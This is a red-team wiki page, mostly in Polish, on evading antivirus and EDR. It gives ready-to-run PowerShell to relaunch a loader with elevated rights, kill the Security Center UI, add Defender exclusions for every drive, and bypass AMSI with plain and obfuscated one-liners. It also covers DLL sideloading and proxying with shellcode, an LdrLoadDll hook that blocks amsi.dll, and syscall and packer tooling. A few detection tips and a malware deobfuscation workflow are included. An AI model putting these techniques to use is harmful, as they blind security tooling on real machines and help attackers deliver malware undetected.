# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie służące do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące Windows Defender przez podszywanie się pod inne AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed ingerencją w Defendera

Publiczne loadery podszywające się pod cheaty do gier często są dystrybuowane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień** i dopiero potem unieszkodliwiają Defendera. Przebieg jest prosty:

1. Sprawdza kontekst administracyjny za pomocą `net session`. Polecenie powiedzie się tylko, gdy wywołujący ma prawa admina, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast ponownie uruchamia się z użyciem parametru `RunAs`, aby wywołać oczekiwany monit zgody UAC, jednocześnie zachowując oryginalną linię poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
### Szerokie wykluczenia `MpPreference` dla każdej litery dysku

Po eskalacji uprawnień, GachiLoader-style chains maksymalizują luki w wykrywaniu Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) i następnie dodaje **bardzo szerokie wykluczenia**, dzięki czemu każdy profil użytkownika, katalog systemowy i dysk wymienny stają się niemożliwe do przeskanowania:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Pętla przeszukuje każdy zamontowany system plików (D:\, E:\, pendrive'y itp.), więc **każdy przyszły payload upuszczony gdziekolwiek na dysku jest ignorowany**.
- Wyłączenie rozszerzenia `.sys` jest perspektywiczne — atakujący zyskują opcję załadowania niesignowanych driverów później bez ponownego dotykania Defendera.
- Wszystkie zmiany trafiają pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala późniejszym etapom potwierdzić, że wyłączenia utrzymują się lub je rozszerzyć bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie jest zatrzymywana, naiwny check zdrowia nadal raportuje „antivirus active”, nawet jeśli inspekcja w czasie rzeczywistym nigdy nie dotyka tych ścieżek.

## **AV Evasion Methodology**

Obecnie AV używają różnych metod sprawdzania, czy plik jest złośliwy: static detection, dynamic analysis oraz, w przypadku bardziej zaawansowanych EDRów, behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych złośliwych ciągów lub tablic bajtów w binarium lub skrypcie, oraz na ekstrakcji informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie już zostały przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego typu wykrywania:

- **Encryption**

Jeśli zaszyfrujesz binarium, AV nie będzie miało możliwości wykryć twojego programu, ale będziesz potrzebował loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuscation**

Czasem wystarczy zmienić kilka ciągów w binarium lub skrypcie, aby przejść przez AV, ale może to być czasochłonne w zależności od tego, co chcesz obfuskować.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych złych sygnatur, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzenia wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i żąda od Defendera przeskanowania każdego z nich osobno — w ten sposób potrafi dokładnie wskazać, które ciągi lub bajty w binarium są oznaczane.

Gorąco polecam sprawdzić tę [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Dynamic analysis to sytuacja, gdy AV uruchamia twoje binarium w sandboxie i obserwuje złośliwe zachowania (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, by ominąć sandboxy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na obejście dynamic analysis AV. AV mają bardzo mało czasu na skanowanie plików, aby nie przerywać pracy użytkownika, więc użycie długich sleepów może zaburzyć analizę binariów. Problem w tym, że wiele sandboxów AV potrafi po prostu pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboxy mają bardzo mało zasobów do wykorzystania (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz tu również wykazać się kreatywnością — np. sprawdzając temperaturę CPU lub prędkości wentylatorów; nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz targetować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i porównać ją z oczekiwaną; jeśli się nie zgadza, program może zakończyć działanie.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, jesteś w sandboxie Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z sandboxami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? Albo czy możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS.

Prawdopodobnie właściwą odpowiedzią jest to drugie. Biorąc mimikatz jako przykład, jest to prawdopodobnie jedno z — jeśli nie najbardziej — oznaczonych narzędzi przez AV i EDR; choć projekt sam w sobie jest super, to praca z nim w celu obejścia AV jest koszmarem, więc po prostu poszukaj alternatyw do osiągnięcia tego, co chcesz.

> [!TIP]
> Modyfikując swoje payloady w celu evasion, upewnij się, że wyłączyłeś automatic sample submission w defenderze, i proszę — na serio — **NIE WYSYŁAJ NA VIRUSTOTAL**, jeśli twoim celem jest długoterminowe osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatic sample submission i testuj tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Kiedykolwiek to możliwe, zawsze **priorytetowo używaj DLLs dla evasion** — z mojego doświadczenia, pliki DLL są zwykle **znacznie rzadziej wykrywane** i analizowane, więc to bardzo prosty trik, aby uniknąć wykrycia w niektórych przypadkach (jeśli twój payload ma sposób uruchomienia się jako DLL, oczywiście).

Jak widać na tym obrazku, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE payload ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka trików, których możesz użyć z plikami DLL, aby być dużo bardziej stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) i następującego powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Gorąco zalecam, abyś **samodzielnie zbadał DLL Hijackable/Sideloadable programs**, ta technika jest dość dyskretna przy odpowiednim użyciu, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo wykryty.

Samo umieszczenie złośliwej DLL o nazwie, którą program oczekuje załadować, nie spowoduje uruchomienia twojego payloadu, ponieważ program oczekuje konkretnych funkcji w tej DLL; aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwej) DLL do oryginalnej DLL, zachowując tym samym funkcjonalność programu i umożliwiając obsługę wykonania twojego payloadu.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL i oryginalny, przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrycia 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Gorąco polecam obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz również [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules mogą eksportować funkcje, które są w rzeczywistości "forwarders": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w postaci `TargetDll.TargetFunc`. Gdy wywołujący rozwiąże wpis eksportu, Windows loader:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Kluczowe zachowania do zrozumienia:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

To umożliwia pośrednią prymitywę sideloading: znajdź podpisany DLL, który eksportuje funkcję przekierowaną do nazwy modułu niebędącego KnownDLL, a następnie umieść ten podpisany DLL razem z kontrolowanym przez atakującego DLL o dokładnie takiej samej nazwie jak przekierowany moduł docelowy. Gdy wywołany zostanie przekierowany eksport, loader rozwiąże przekierowanie i załaduje Twój DLL z tego samego katalogu, wykonując Twój DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy plik DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować funkcji przekierowanej, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wywołaj przekierowanie przy użyciu podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i uruchamia jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowany, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykona

Wskazówki do wykrywania:
- Skup się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły dotyczące wykrywania i obrony:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z poza katalogów systemowych, po czym ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów proces/moduł takich jak: `rundll32.exe` → nie-systemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj polityki integralności kodu (WDAC/AppLocker) i zabraniaj jednoczesnego zapisu i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi typu payload do omijania EDRs, wykorzystujący suspended processes, direct syscalls oraz alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to tylko gra w kota i myszkę — to, co działa dzisiaj, może zostać wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć kilka evasion techniques.

## Bezpośrednie/Pośrednie Syscalls & SSN Resolution (SysWhispers4)

EDRs często umieszczają **user-mode inline hooks** na `ntdll.dll` syscall stubs. Aby obejść te hooki, możesz wygenerować **direct** lub **indirect** syscall stubs, które ładują poprawne **SSN** (System Service Number) i przechodzą do kernel mode bez wykonywania zahookowanego export entrypoint.

**Opcje wywołania:**
- **Direct (embedded)**: wstaw instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (no `ntdll` export hit).
- **Indirect**: skocz do istniejącego `syscall` gadgetu wewnątrz `ntdll`, tak aby przejście do kernel mode wyglądało, jakby pochodziło z `ntdll` (useful for heuristic evasion); **randomized indirect** wybiera gadget z puli przy każdym wywołaniu.
- **Egg-hunt**: unikaj osadzania statycznej sekwencji opcode `0F 05` na dysku; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address zamiast czytania stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z rejestru `EAX` w czasie wykonywania, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został stworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się wykonać payloady **bezpośrednio w pamięci**, AV nie mogło nic zrobić, ponieważ nie miało wystarczającej widoczności.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (podnoszenie przywilejów EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne oraz dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów przez ujawnienie ich zawartości w postaci niezaszyfrowanej i niezobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` po którym następuje ścieżka do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również przekazywany przez AMSI. To dotyczy nawet `Assembly.Load(byte[])` przy ładowaniu do pamięci. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do wykonywania w pamięci, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie za pomocą detekcji statycznej, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI potrafi deobfuskować skrypty nawet jeśli mają wiele warstw, więc obfuscation może być złą opcją w zależności od sposobu jej wykonania. To sprawia, że obejście nie jest trywialne. Czasem wystarczy zmienić kilka nazw zmiennych i będzie ok, więc to zależy od stopnia wykrycia.

- **AMSI Bypass**

Ponieważ AMSI jest implementowany przez załadowanie DLL do procesu powershell (oraz cscript.exe, wscript.exe itd.), możliwe jest łatwe manipulowanie nim nawet przy działaniu jako nieuprzywilejowany użytkownik. Z powodu tej wady w implementacji AMSI badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie będzie uruchomione żadne skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby ograniczyć szerokie zastosowanie tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa zarówno w PowerShell, WScript/CScript, jak i w niestandardowych loaderach (wszystko, co w przeciwnym razie ładowałoby AMSI).
- Łącz z podawaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Obserwowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generuje także skrypt umożliwiający obejście AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** generuje skrypt omijający AMSI, który zapobiega wykryciu przez losowanie nazw funkcji użytkownika, zmiennych, wyrażeń znakowych oraz przez stosowanie losowej wielkości liter w słowach kluczowych PowerShell, aby uniknąć sygnatur.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie to działa przez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR używające AMSI**

Listę produktów AV/EDR korzystających z AMSI można znaleźć w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala na rejestrowanie wszystkich poleceń PowerShell wykonywanych na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez zabezpieczeń (to jest to, czego używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora *module* (`<Module>.cctor`). To także modyfikuje PE checksum, więc każda zmiana spowoduje awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać XOR keys i przepisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Symbol / control-flow recovery – podaj *clean* plik do **de4dot-cex** (forka de4dot świadomego ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wybierz profil ConfuserEx 2  
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe stringi.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne .NET API, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieczytelnych wrapperów (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom wynikowy binarny plik w dnSpy, wyszukaj duże Base64 bloby lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-encoded byte array zainicjalizowany wewnątrz `<Module>.byte_0`.

Powyższy ciąg kroków przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwego sample — przydatne podczas pracy na offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego zapewnić zwiększone bezpieczeństwo oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz zabezpieczenia przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do wygenerowania, w czasie kompilacji, obfuscated code bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co utrudni życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator potrafiący obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to drobnoziarnisty framework code obfuscation dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu assemblera, przekształcając zwykłe instrukcje w ROP chains, podważając nasze naturalne pojmowanie normalnego control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
